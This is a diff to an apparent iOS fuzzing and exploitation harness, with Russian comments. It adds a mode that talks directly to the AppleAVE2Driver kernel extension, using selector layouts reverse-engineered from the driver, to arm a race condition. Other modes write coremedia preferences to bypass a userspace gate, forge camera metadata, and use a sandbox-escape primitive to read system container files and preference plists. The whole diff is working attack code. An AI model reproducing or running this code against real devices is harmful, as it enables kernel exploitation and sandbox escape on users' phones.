@@ -43326,6 +43326,11 @@ static int bq83_setbool(VTCompressionSessionRef s, CFStringRef key, bool v) {
 // AirPlay→2, SafeView→3, ScreenSharing→4, MediaAnalysis→5, SideCar→7 — константы
 // ave.videoencoder; DevCap-таблица MCTF индексируется clientType×encType).
 static char g_bq83_usage[32] = "";
+// v240 (§233): ISP-метаданные-подделка — FIG требует камерный аттачмент
+// "MetadataDictionary" (ключи расшифрованы из ave.videoencoder), без него
+// GetGatingType(NULL) валит каждый кадр (-17691). SensorID=0 матчится с
+// SMap-записью C0x0 из AVE_MCTF_SMap-префа.
+static int g_bq83_isp = 0;
 
 // Ставит MCTF-набор (ключи из ave.videoencoder 24A5390f, §231); возвращает
 // количество принятых (noErr) свойств. verbose: лог каждой попытки.
@@ -43431,6 +43436,28 @@ static OSStatus bq83_encode_one(VTCompressionSessionRef s, int w, int h,
             memset(base + r * bpr, v ^ (uint8_t)(r & 0x1f), bpr);
     }
     CVPixelBufferUnlockBaseAddress(pb, 0);
+    if (g_bq83_isp) {
+        NSDictionary *isp = @{
+            @"SNR": @20.0,
+            @"NormalizedSNR": @0.5,
+            @"ExposureTime": @0.033,
+            @"AGC": @1.0,
+            @"ispDGain": @1.0,
+            @"sensorDGain": @1.0,
+            @"ispDGainRangeExpansionFactor": @1.0,
+            @"SensorID": @0,
+            @"ScalingFactor": @1.0,
+            @"LuxLevel": @100,
+            @"QuadraBinningFactor": @1,
+            @"BayerBinningFactor": @1,
+            @"Fnumber": @2.8,
+            @"TemporalNoiseReductionBand0Strength": @12,
+            @"TemporalNoiseReductionBand0StrengthModulationEnabled": @YES,
+        };
+        CVBufferSetAttachment(pb, CFSTR("MetadataDictionary"),
+                              (__bridge CFTypeRef)isp,
+                              kCVAttachmentMode_ShouldPropagate);
+    }
     VTEncodeInfoFlags info = 0;
     OSStatus st = VTCompressionSessionEncodeFrame(s, pb,
         CMTimeMake(1 + f + cy * 4096, 30), CMTimeMake(1, 30), NULL, NULL, &info);
@@ -43626,6 +43653,541 @@ static void p_bq83(void) {
     LOG("[bq83] ИТОГ mode=%s mctf=%d fmt=%s: done=%d errs=%d sbs=%d inflight=%d "
         "(устройство живо; panic = ушли в ребут)", mode_s, mctf,
         bq83_fmt_name(fmt), c->done, c->errs, c->sbs, c->inflight);
+    fsync(fileno(stderr));
+}
+
+// p_bq84 — v240: ПРЯМОЙ IOKit-клиент AppleAVE2Driver. Протокол §233
+// (декомпиляты ave.videoencoder + ave2-кекст): обходим userspace-гейт FIG
+// и говорим с кекстом теми же командами, что и настоящий кодек —
+// цель: гонка §231 (MCTF plane-0 + order-счётчик) под нашей хореографией.
+//   IOServiceMatching("AppleAVE2Driver") → IOServiceOpen(type 1..5)
+//   sel 1  Open    in 0x760 {hdr; ver "913.29.1"@0x28; DW_Cfg 0x610@0x38} out 0x38
+//   sel 2  Close   in 0x28;  sel 3 Config in 0x38 (+scalar=handle);
+//   sel 4  Prepare in 0x12c00; sel 5 Start in 0x12c10;
+//   sel 6  Stop / 7 Process / 8 Complete / 10 Reset in 0x30
+// DW-дефолты — транскрипция AVE_DW_Cfg_Init (сентинелы; прочее нули).
+// Режимы: FUZZ_BQ84_TYPE=<1..5> (1), FUZZ_BQ84_SWEEP=1 (все типы),
+//   FUZZ_BQ84_PROBE=1 (селекторы 0..15 нулём), FUZZ_BQ84_RESETS=<N>.
+static void bq84_dw_defaults(uint8_t *cfg) {
+    memset(cfg, 0, 0x610);
+    *(uint32_t *)(cfg + 0x00) = 0xffffffff;
+    *(uint32_t *)(cfg + 0x48) = 0xfffffffe;
+    *(uint32_t *)(cfg + 0x50) = 0xfffffffe;
+    for (int i = 0; i < 6; i++)
+        *(uint64_t *)(cfg + 0x7c + i * 0x30) = 0xffffffffffffffffULL;
+    *(uint32_t *)(cfg + 0x2f4) = 0xffffffff;
+    *(uint64_t *)(cfg + 0x310) = 0xfffffff3fffffff3ULL;
+    *(uint32_t *)(cfg + 0x318) = 0xfffffffe;
+    *(uint32_t *)(cfg + 0x324) = 0xfffffff3;
+    *(uint64_t *)(cfg + 0x328) = 0xfffffff3fffffff3ULL;
+    *(uint64_t *)(cfg + 0x330) = 0xbff0000000000000ULL;
+    *(uint64_t *)(cfg + 0x348) = 0xbff0000000000000ULL;
+    *(uint64_t *)(cfg + 0x380) = 0xffffffffffffffffULL;
+    *(uint64_t *)(cfg + 0x390) = 0xffffffffffffffffULL;
+    *(uint64_t *)(cfg + 0x398) = 0xbff0000000000000ULL;
+    *(uint64_t *)(cfg + 0x3a0) = 0xbff0000000000000ULL;
+    *(uint64_t *)(cfg + 0x3d8) = 0xfffffff3fffffff3ULL;
+    *(uint32_t *)(cfg + 0x414) = 0xffffffff;
+    *(uint64_t *)(cfg + 0x41c) = 0xffffffffffffffffULL;
+    *(uint64_t *)(cfg + 0x440) = 0xbff0000000000000ULL;
+    *(uint64_t *)(cfg + 0x448) = 0xbff0000000000000ULL;
+    *(uint64_t *)(cfg + 0x460) = 0xffffffffffffffffULL;
+    *(uint64_t *)(cfg + 0x468) = 0xffffffffffffffffULL;
+    *(uint32_t *)(cfg + 0x470) = 0;
+    for (int j = 0; j < 2; j++) {
+        *(uint64_t *)(cfg + 0x480 + j * 0xb8) = 0xffffffffffffffffULL;
+        for (int i = 0; i < 7; i++)
+            *(uint64_t *)(cfg + 0x49c + i * 0x10 + j * 0xb8) =
+                0x7ff8000000000000ULL;   // NaN
+    }
+    *(uint64_t *)(cfg + 0x5e8) = 0xffffffffffffffffULL;
+    *(uint64_t *)(cfg + 0x5f4) = 0xffffffffffffffffULL;
+}
+
+static void bq84_hex(const char *tag, const uint8_t *p, size_t n) {
+    for (size_t i = 0; i < n; i += 16) {
+        char b[16 * 3 + 8] = "";
+        int o = 0;
+        for (size_t j = 0; j < 16 && i + j < n; j++)
+            o += snprintf(b + o, sizeof(b) - o, "%02x ", p[i + j]);
+        LOG("[bq84] %s +%#04zx: %s", tag, i, b);
+    }
+}
+
+static void bq84_setpref_bool(CFStringRef k, bool v) {
+    CFPreferencesSetAppValue(k, v ? kCFBooleanTrue : kCFBooleanFalse,
+                             CFSTR("com.apple.coremedia"));
+}
+
+static void bq84_setpref_int(CFStringRef k, int v) {
+    CFNumberRef n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &v);
+    CFPreferencesSetAppValue(k, n, CFSTR("com.apple.coremedia"));
+    CFRelease(n);
+}
+
+static void bq84_setpref_str(CFStringRef k, const char *s) {
+    CFStringRef v = CFStringCreateWithCString(kCFAllocatorDefault, s,
+                                               kCFStringEncodingUTF8);
+    CFPreferencesSetAppValue(k, v, CFSTR("com.apple.coremedia"));
+    CFRelease(v);
+}
+
+static void p_bq84(void) {
+    LOG("[bq84] v240: прямой IOKit-клиент AppleAVE2Driver (протокол §233)");
+    fsync(fileno(stderr));
+    int def_type = getenv("FUZZ_BQ84_TYPE") ? atoi(getenv("FUZZ_BQ84_TYPE")) : 1;
+    int sweep = getenv("FUZZ_BQ84_SWEEP") ? atoi(getenv("FUZZ_BQ84_SWEEP")) : 0;
+    int probe = getenv("FUZZ_BQ84_PROBE") ? atoi(getenv("FUZZ_BQ84_PROBE")) : 0;
+    int nresets = getenv("FUZZ_BQ84_RESETS") ? atoi(getenv("FUZZ_BQ84_RESETS")) : 0;
+    int arm = getenv("FUZZ_BQ84_ARM") ? atoi(getenv("FUZZ_BQ84_ARM")) : 0;
+    int t_lo = sweep ? 1 : def_type, t_hi = sweep ? 5 : def_type;
+
+    // --- преф-проба DW-слоя (§233): домен com.apple.coremedia ---
+    // Кодек читает AVE_* ключи ЖИВО на каждый сеттер; если наш процесс
+    // умеет писать этот домен — MCTF/SMap override в обход FIG.
+    {
+        CFStringRef dom = CFSTR("com.apple.coremedia");
+        CFTypeRef v = CFPreferencesCopyAppValue(CFSTR("AVE_EnableMCTF"), dom);
+        LOG("[bq84] pref read AVE_EnableMCTF (com.apple.coremedia): %p", v);
+        if (v) {
+            CFTypeID t = CFGetTypeID(v);
+            if (t == CFBooleanGetTypeID())
+                LOG("[bq84]   -> bool %d", (int)CFBooleanGetValue(v));
+            else if (t == CFNumberGetTypeID()) {
+                int n = 0;
+                CFNumberGetValue(v, kCFNumberIntType, &n);
+                LOG("[bq84]   -> int %d", n);
+            } else if (t == CFStringGetTypeID()) {
+                char b[128];
+                CFStringGetCString(v, b, sizeof(b), kCFStringEncodingUTF8);
+                LOG("[bq84]   -> str %s", b);
+            }
+            CFRelease(v);
+        }
+        CFPreferencesSetAppValue(CFSTR("AVE_EnableMCTF"), kCFBooleanTrue, dom);
+        Boolean ok = CFPreferencesAppSynchronize(dom);
+        LOG("[bq84] pref WRITE AVE_EnableMCTF=true sync=%d", (int)ok);
+        v = CFPreferencesCopyAppValue(CFSTR("AVE_EnableMCTF"), dom);
+        LOG("[bq84] pref READBACK: %p (%s)", v,
+            (v && CFGetTypeID(v) == CFBooleanGetTypeID() &&
+             CFBooleanGetValue(v)) ? "TRUE - ЗАПИСЬ РАБОТАЕТ" : "нет/не-bool");
+        if (v) CFRelease(v);
+        fsync(fileno(stderr));
+    }
+
+    if (arm == 5) {
+        // ARM5: ISP-подделка + SMap-override + полный MCTF-джойнт.
+        const char *smap = getenv("FUZZ_BQ84_SMAP");
+        char smap_def[] =
+            "C0x0 I0x0 L0x0 U0x7fffffff S0xc "
+            "C0xffffffff I0x1 L0x0 U0x7fffffff S0xc";
+        if (!smap || !smap[0]) smap = smap_def;
+        LOG("[bq84] ARM5: SMap='%s' + ISP-аттачмент SensorID=0", smap);
+        bq84_setpref_str(CFSTR("AVE_MCTF_SMap"), smap);
+        bq84_setpref_bool(CFSTR("AVE_EnableMCTF"), true);
+        bq84_setpref_int(CFSTR("AVE_MCTFStrengthLevel"), 12);
+        bq84_setpref_bool(CFSTR("AVE_MCTFEnableGating"), true);
+        bq84_setpref_bool(CFSTR("AVE_MCTFEnableFeedback"), true);
+        bq84_setpref_int(CFSTR("AVE_MCTFLatencyMode"), 1);
+        CFPreferencesAppSynchronize(CFSTR("com.apple.coremedia"));
+        g_bq83_isp = 1;
+        bq83_ctx *c = calloc(1, sizeof(*c));
+        c->sem = dispatch_semaphore_create(0);
+        VTCompressionSessionRef s = NULL;
+        OSStatus st = bq83_create(&s, 1280, 720, c);
+        if (st == noErr) {
+            int okp = bq83_apply_mctf(s, 12, 0, 1, true);
+            LOG("[bq84] ARM5: session ok, okprops=%d; 3 кадра с ISP", okp);
+            bool le = false;
+            for (int f = 0; f < 3; f++)
+                if (bq83_encode_one(s, 1280, 720, f, 0, &le, 0) == noErr)
+                    c->inflight++;
+            sleep(2);
+            VTCompressionSessionInvalidate(s);
+            CFRelease(s);
+        } else {
+            LOG("[bq84] ARM5: create FAILED %d", (int)st);
+        }
+        LOG("[bq84] ARM5: done=%d errs=%d sbs=%d  %s", c->done, c->errs,
+            c->sbs,
+            c->errs == 0 && c->sbs > 0
+                ? "*** MCTF-КАДРЫ ПРОШЛИ! ГОНКА ВООРУЖЕНА ***"
+                : (c->sbs > 0 ? "частично" : "malfunction остался"));
+        g_bq83_isp = 0;
+        LOG("[bq84] ИТОГ ARM5");
+        fsync(fileno(stderr));
+        return;
+    }
+
+    if (arm == 4) {
+        // ARM4: полный DW-джойнт MCTF: AVE_MCTF_SMap (грамматика §233:
+        // пары "Буква=значение": C=sensorID I=entryIdx(0|1) T=доп.поле
+        // L=rlo U=rhi P=доп.массив S=strength(коммит диапазона);
+        // workMode записи парсер всегда пишет 0 = wildcard; mask=ALL).
+        // Две записи: sensorID=0 и 0xffffffff (синтетика без ISP-метаданных).
+        const char *smap = getenv("FUZZ_BQ84_SMAP");
+        char smap_def[] =
+            "C0x0 I0x0 L0x0 U0x7fffffff S0xc "
+            "C0xffffffff I0x1 L0x0 U0x7fffffff S0xc";
+        if (!smap || !smap[0]) smap = smap_def;
+        LOG("[bq84] ARM4: SMap='%s'", smap);
+        bq84_setpref_str(CFSTR("AVE_MCTF_SMap"), smap);
+        bq84_setpref_bool(CFSTR("AVE_EnableMCTF"), true);
+        bq84_setpref_int(CFSTR("AVE_MCTFStrengthLevel"), 12);
+        bq84_setpref_bool(CFSTR("AVE_MCTFEnableGating"), true);
+        bq84_setpref_bool(CFSTR("AVE_MCTFEnableFeedback"), true);
+        bq84_setpref_int(CFSTR("AVE_MCTFLatencyMode"), 1);
+        bq84_setpref_int(CFSTR("AVE_MCTFStrengthLevel"), 12);
+        bq84_setpref_int(CFSTR("AVE_MCTFStrengthDelta"), 0);
+        bq84_setpref_int(CFSTR("AVE_MCTFRampUpFrameNum"), 0);
+        bq84_setpref_int(CFSTR("AVE_MCTFMaxNextRefNum"), 1);
+        CFPreferencesAppSynchronize(CFSTR("com.apple.coremedia"));
+        LOG("[bq84] ARM4: префы синхронизированы; mini-encode с MCTF");
+        bq83_ctx *c = calloc(1, sizeof(*c));
+        c->sem = dispatch_semaphore_create(0);
+        VTCompressionSessionRef s = NULL;
+        OSStatus st = bq83_create(&s, 1280, 720, c);
+        if (st == noErr) {
+            int okp = bq83_apply_mctf(s, 12, 0, 1, true);
+            LOG("[bq84] ARM4: session ok, okprops=%d; 3 кадра", okp);
+            bool le = false;
+            for (int f = 0; f < 3; f++)
+                if (bq83_encode_one(s, 1280, 720, f, 0, &le, 0) == noErr)
+                    c->inflight++;
+            sleep(2);
+            VTCompressionSessionInvalidate(s);
+            CFRelease(s);
+        } else {
+            LOG("[bq84] ARM4: create FAILED %d", (int)st);
+        }
+        LOG("[bq84] ARM4: done=%d errs=%d sbs=%d  %s", c->done, c->errs,
+            c->sbs,
+            c->errs == 0 && c->sbs > 0
+                ? "*** MCTF-КАДРЫ ПРОШЛИ! ГОНКА ВООРУЖЕНА ***"
+                : (c->sbs > 0 ? "частично" : "malfunction остался"));
+        LOG("[bq84] ИТОГ ARM4");
+        fsync(fileno(stderr));
+        return;
+    }
+
+    if (arm == 3) {
+        // ARM3: карта «контейнер → владелец» (MCMMetadata) + контейнер
+        // видеocodecd: tmp/ave_fig.log, Library/Preferences (§176-стиль).
+        const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+        const uint64_t F_DEF = 0x0000008000000000ULL;
+        int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+        LOG("[bq84] ARM3 escape handle=%lld%s", (long long)h,
+            h < 0 ? "  *** NO ESCAPE ***" : "");
+        if (h < 0) return;
+        const char *base = "/var/containers/Data/System";
+        DIR *d = opendir(base);
+        if (!d) { LOG("[bq84] ARM3 opendir errno %d", errno); return; }
+        struct dirent *de;
+        char vcc[256] = "";
+        while ((de = readdir(d)) != NULL) {
+            if (de->d_name[0] == '.') continue;
+            char mp[600];
+            snprintf(mp, sizeof(mp),
+                     "%s/%s/.com.apple.mobile_container_manager.metadata.plist",
+                     base, de->d_name);
+            NSData *pldat = [NSData dataWithContentsOfFile:[NSString stringWithUTF8String:mp]];
+            NSString *owner = @"";
+            if (pldat) {
+                NSError *err = nil;
+                NSDictionary *pl = [NSPropertyListSerialization
+                    propertyListWithData:pldat options:0 format:NULL error:&err];
+                NSDictionary *meta = pl[@"MCMMetadata"];
+                owner = meta[@"MCMMetadataOwner"] ?: @"";
+                if (![owner isKindOfClass:[NSString class]]) owner = @"";
+                if (!owner.length) {
+                    NSString *desc = [meta description] ?: [pl description];
+                    owner = [desc length] > 200 ?
+                        [desc substringToIndex:200] : desc;
+                }
+            } else {
+                owner = [NSString stringWithFormat:@"no-metadata errno %d", errno];
+            }
+            LOG("[bq84] ARM3 %s -> %s", de->d_name, owner.UTF8String);
+            if ([owner isKindOfClass:[NSString class]] &&
+                ([owner containsString:@"videocodec"] ||
+                 [owner containsString:@"VideoCodec"] ||
+                 [owner containsString:@"coremedia"])) {
+                snprintf(vcc, sizeof(vcc), "%s/%s", base, de->d_name);
+            }
+        }
+        closedir(d);
+        if (!vcc[0]) {
+            LOG("[bq84] ARM3: контейнер videocodecd НЕ найден");
+            return;
+        }
+        LOG("[bq84] ARM3: контейнер videocodecd = %s", vcc);
+        // tmp/ave_fig.log?
+        char p[600];
+        snprintf(p, sizeof(p), "%s/tmp/ave_fig.log", vcc);
+        struct stat st = {0};
+        if (stat(p, &st) == 0) {
+            LOG("[bq84] ARM3 FIG-LOG НАЙДЕН: %s (%lld bytes)", p,
+                (long long)st.st_size);
+            FILE *f = fopen(p, "r");
+            if (f) {
+                char line[512];
+                int n = 0;
+                while (fgets(line, sizeof(line), f) && n++ < 150)
+                    LOG("[bq84][fig] %s", line);
+                fclose(f);
+                LOG("[bq84][fig] === конец (%d строк) ===", n);
+            }
+        } else {
+            LOG("[bq84] ARM3 fig-лога нет (stat errno %d)", errno);
+        }
+        // Library/Preferences содержимое
+        snprintf(p, sizeof(p), "%s/Library/Preferences", vcc);
+        DIR *pd = opendir(p);
+        if (pd) {
+            struct dirent *pe;
+            while ((pe = readdir(pd)) != NULL) {
+                if (pe->d_name[0] == '.') continue;
+                LOG("[bq84] ARM3 pref: %s", pe->d_name);
+            }
+            closedir(pd);
+        } else {
+            LOG("[bq84] ARM3 opendir(Preferences) errno %d", errno);
+        }
+        LOG("[bq84] ИТОГ ARM3");
+        fsync(fileno(stderr));
+        return;
+    }
+
+    if (arm == 2) {
+        // ARM2: через bad_query-escape ищем, куда легла наша префа и где
+        // живёт FIG (его /tmp/ave_fig.log в контейнере брокера).
+        const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+        const uint64_t F_DEF = 0x0000008000000000ULL;
+        int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+        LOG("[bq84] ARM2 escape handle=%lld%s", (long long)h,
+            h < 0 ? "  *** NO ESCAPE ***" : "");
+        if (h < 0) return;
+        const char *cands[] = {
+            "/var/mobile/Library/Preferences/com.apple.coremedia.plist",
+            "/private/var/mobile/Library/Preferences/com.apple.coremedia.plist",
+            "/var/mobile/Library/Preferences/com.apple.coremedia.plist.new",
+        };
+        for (unsigned i = 0; i < sizeof(cands)/sizeof(cands[0]); i++) {
+            struct stat st = {0};
+            if (stat(cands[i], &st) == 0) {
+                LOG("[bq84] ARM2 pref-file: %s %lld bytes uid=%d",
+                    cands[i], (long long)st.st_size, (int)st.st_uid);
+                FILE *f = fopen(cands[i], "rb");
+                if (f) {
+                    uint8_t buf[4096];
+                    size_t n = fread(buf, 1, sizeof(buf) - 1, f);
+                    buf[n] = 0;
+                    // bplist01 или XML? ищем ключ AVE_EnableMCTF
+                    const char *needle = "AVE_EnableMCTF";
+                    const uint8_t *p = memmem(buf, n, needle, strlen(needle));
+                    LOG("[bq84] ARM2   read %zu bytes; AVE_EnableMCTF: %s",
+                        n, p ? "ПРИСУТСТВУЕТ (наша запись доехала)" : "нет");
+                    if (!p) {
+                        // если bplist — ключ может быть бит-упакован; ищем AVE_
+                        p = memmem(buf, n, "AVE_", 4);
+                        LOG("[bq84] ARM2   AVE_-маркер: %s", p ? "есть" : "нет");
+                    }
+                    fclose(f);
+                }
+            } else {
+                LOG("[bq84] ARM2 pref-file: %s — stat errno %d", cands[i], errno);
+            }
+        }
+        // скан контейнеров: ave_fig.log + com.apple.coremedia.plist
+        const char *base = "/var/containers/Data/System";
+        DIR *d = opendir(base);
+        if (!d) { LOG("[bq84] ARM2 opendir(%s) errno %d", base, errno); return; }
+        struct dirent *de;
+        int ncont = 0, nlog = 0, npref = 0;
+        while ((de = readdir(d)) != NULL) {
+            if (de->d_name[0] == '.') continue;
+            char path[512];
+            snprintf(path, sizeof(path), "%s/%s/tmp/ave_fig.log", base, de->d_name);
+            struct stat st = {0};
+            if (stat(path, &st) == 0) {
+                LOG("[bq84] ARM2 FIG-LOG: %s (%lld bytes)", path,
+                    (long long)st.st_size);
+                FILE *f = fopen(path, "r");
+                if (f) {
+                    char line[512];
+                    int n = 0;
+                    while (fgets(line, sizeof(line), f) && n++ < 120)
+                        LOG("[bq84][fig] %s", line);
+                    fclose(f);
+                    LOG("[bq84][fig] === конец (%d строк) ===", n);
+                }
+                nlog++;
+            }
+            snprintf(path, sizeof(path),
+                     "%s/%s/Library/Preferences/com.apple.coremedia.plist",
+                     base, de->d_name);
+            if (stat(path, &st) == 0) {
+                LOG("[bq84] ARM2 container-pref: %s (%lld bytes)", path,
+                    (long long)st.st_size);
+                npref++;
+            }
+            ncont++;
+        }
+        closedir(d);
+        LOG("[bq84] ARM2: контейнеров=%d fig-логов=%d coremedia-pref=%d",
+            ncont, nlog, npref);
+        LOG("[bq84] ИТОГ ARM2");
+        fsync(fileno(stderr));
+        return;
+    }
+
+    if (arm == 1) {
+        // ARM: включаем собственный лог FIG через префы (запись работает —
+        // см. преф-пробу) + MCTF-override; mini-encode; читаем лог кодека.
+        // Лог-файл в /tmp = наш песочничий /tmp ЕСЛИ кодек in-process.
+        LOG("[bq84] ARM: пишем DW-префы (лог + MCTF-override)");
+        bq84_setpref_str(CFSTR("AVE_LogPath"), "/tmp/ave_fig.log");
+        bq84_setpref_int(CFSTR("AVE_Level"), 8);
+        bq84_setpref_int(CFSTR("AVE_LogConsole"), 1);
+        bq84_setpref_int(CFSTR("AVE_Verbose"), 1);
+        bq84_setpref_int(CFSTR("AVE_KernelVerbose"), 1);
+        bq84_setpref_int(CFSTR("AVE_FirmwareVerbose"), 1);
+        bq84_setpref_bool(CFSTR("AVE_EnableMCTF"), true);
+        bq84_setpref_int(CFSTR("AVE_MCTFStrengthLevel"), 12);
+        bq84_setpref_bool(CFSTR("AVE_MCTFEnableGating"), true);
+        bq84_setpref_bool(CFSTR("AVE_MCTFEnableFeedback"), true);
+        bq84_setpref_int(CFSTR("AVE_MCTFLatencyMode"), 1);
+        CFPreferencesAppSynchronize(CFSTR("com.apple.coremedia"));
+        LOG("[bq84] ARM: префы синхронизированы; mini-encode с MCTF");
+        bq83_ctx *c = calloc(1, sizeof(*c));
+        c->sem = dispatch_semaphore_create(0);
+        VTCompressionSessionRef s = NULL;
+        OSStatus st = bq83_create(&s, 1280, 720, c);
+        if (st == noErr) {
+            int okp = bq83_apply_mctf(s, 12, 0, 1, true);
+            LOG("[bq84] ARM: session ok, okprops=%d; 3 кадра", okp);
+            bool le = false;
+            for (int f = 0; f < 3; f++)
+                if (bq83_encode_one(s, 1280, 720, f, 0, &le, 0) == noErr)
+                    c->inflight++;
+            sleep(2);
+            VTCompressionSessionInvalidate(s);
+            CFRelease(s);
+        } else {
+            LOG("[bq84] ARM: create FAILED %d", (int)st);
+        }
+        LOG("[bq84] ARM: done=%d errs=%d sbs=%d", c->done, c->errs, c->sbs);
+        FILE *f = fopen("/tmp/ave_fig.log", "r");
+        if (f) {
+            char line[512];
+            int n = 0;
+            LOG("[bq84] === /tmp/ave_fig.log: ===");
+            while (fgets(line, sizeof(line), f) && n++ < 100) {
+                size_t L = strlen(line);
+                if (L && line[L - 1] == '\n') line[L - 1] = 0;
+                LOG("[bq84][fig] %s", line);
+            }
+            fclose(f);
+            LOG("[bq84] === конец fig-лога (%d строк) ===", n);
+        } else {
+            LOG("[bq84] /tmp/ave_fig.log НЕ создан — кодек не in-process "
+                "или лог не включился");
+        }
+        LOG("[bq84] ИТОГ ARM");
+        fsync(fileno(stderr));
+        return;
+    }
+
+    for (int type = t_lo; type <= t_hi; type++) {
+        io_service_t svc = IOServiceGetMatchingService(
+            kIOMainPortDefault, IOServiceMatching("AppleAVE2Driver"));
+        if (!svc) {
+            LOG("[bq84] type=%d: AppleAVE2Driver НЕ НАЙДЕН", type);
+            continue;
+        }
+        io_connect_t conn = 0;
+        kern_return_t kr = IOServiceOpen(svc, mach_task_self(), type, &conn);
+        IOObjectRelease(svc);
+        LOG("[bq84] type=%d IOServiceOpen kr=%#x conn=%#x", type, kr, conn);
+        if (kr != KERN_SUCCESS || !conn) continue;
+
+        if (probe) {
+            // разведка селекторов: нулевая 0x30-структура на 0..15
+            for (uint32_t sel = 0; sel < 16; sel++) {
+                uint8_t zin[0x30] = {0}, zout[0x100] = {0};
+                size_t osz = sizeof(zout);
+                kr = IOConnectCallStructMethod(conn, sel, zin, sizeof(zin),
+                                               zout, &osz);
+                LOG("[bq84] type=%d PROBE sel=%u kr=%#x outsz=%zu",
+                    type, sel, kr, osz);
+                if (kr == KERN_SUCCESS) bq84_hex("probe-out", zout, osz);
+            }
+            IOServiceClose(conn);
+            continue;
+        }
+
+        // --- sel 1: Open (0x760) ---
+        static uint8_t oin[0x760];
+        memset(oin, 0, sizeof(oin));
+        strcpy((char *)(oin + 0x28), "913.29.1");
+        bq84_dw_defaults(oin + 0x38);
+        uint8_t oout[0x38] = {0};
+        size_t oosz = sizeof(oout);
+        kr = IOConnectCallStructMethod(conn, 1, oin, sizeof(oin), oout, &oosz);
+        LOG("[bq84] type=%d Open kr=%#x outsz=%zu", type, kr, oosz);
+        if (kr != KERN_SUCCESS) {
+            bq84_hex("open-out", oout, oosz);
+            IOServiceClose(conn);
+            continue;
+        }
+        bq84_hex("open-out", oout, oosz);
+        uint64_t hdl = *(uint64_t *)oout;
+        LOG("[bq84] type=%d HANDLE=%#llx", type, hdl);
+
+        // --- sel 3: Config (0x38; scalar=handle) ---
+        uint8_t cin[0x38] = {0};
+        *(uint64_t *)(cin + 0x28) = hdl;      // после 0x28-байтной шапки
+        uint64_t scin = hdl, scout[8] = {0};
+        uint32_t scout_n = 8;
+        uint8_t cout[0x38] = {0};
+        size_t cosz = sizeof(cout);
+        kr = IOConnectCallMethod(conn, 3, &scin, 1, cin, sizeof(cin),
+                                 scout, &scout_n, cout, &cosz);
+        LOG("[bq84] type=%d Config kr=%#x scout_n=%u cosz=%zu", type, kr,
+            scout_n, cosz);
+        if (kr == KERN_SUCCESS) bq84_hex("cfg-out", cout, cosz);
+
+        // --- sel 10: Reset (0x30) — race-проба ---
+        uint8_t rin[0x30] = {0};
+        *(uint64_t *)(rin + 0x28) = hdl;
+        for (int i = 0; i < nresets; i++) {
+            uint8_t rout[0x38] = {0};
+            size_t rsz = sizeof(rout);
+            kr = IOConnectCallStructMethod(conn, 10, rin, sizeof(rin),
+                                           rout, &rsz);
+            if (i == 0 || kr != KERN_SUCCESS)
+                LOG("[bq84] type=%d Reset#%d kr=%#x", type, i, kr);
+            if (kr != KERN_SUCCESS) break;
+        }
+        if (!nresets) {
+            uint8_t rout[0x38] = {0};
+            size_t rsz = sizeof(rout);
+            kr = IOConnectCallStructMethod(conn, 10, rin, sizeof(rin),
+                                           rout, &rsz);
+            LOG("[bq84] type=%d Reset(single) kr=%#x", type, kr);
+        }
+
+        // --- sel 2: Close (0x28) ---
+        uint8_t clin[0x28] = {0};
+        uint8_t clout[0x28] = {0};
+        size_t clsz = sizeof(clout);
+        kr = IOConnectCallStructMethod(conn, 2, clin, sizeof(clin),
+                                       clout, &clsz);
+        LOG("[bq84] type=%d Close kr=%#x", type, kr);
+        IOServiceClose(conn);
+        LOG("[bq84] type=%d цикл завершён (устройство живо)", type);
+    }
+    LOG("[bq84] ИТОГ: клиент отработал");
     fsync(fileno(stderr));
 }
 
@@ -51138,6 +51700,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ81")) { p_bq81(); LOG("[probe13] bq81-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ82")) { p_bq82(); LOG("[probe13] bq82-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ83")) { p_bq83(); LOG("[probe13] bq83-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ84")) { p_bq84(); LOG("[probe13] bq84-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XPCENUM")) { p_xpcenum(); LOG("[xpcen] xpcenum-only mode, stop"); return NULL; }
         if (getenv("FUZZ_ASTRIS")) { p_astris(); LOG("[probe13] astris-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
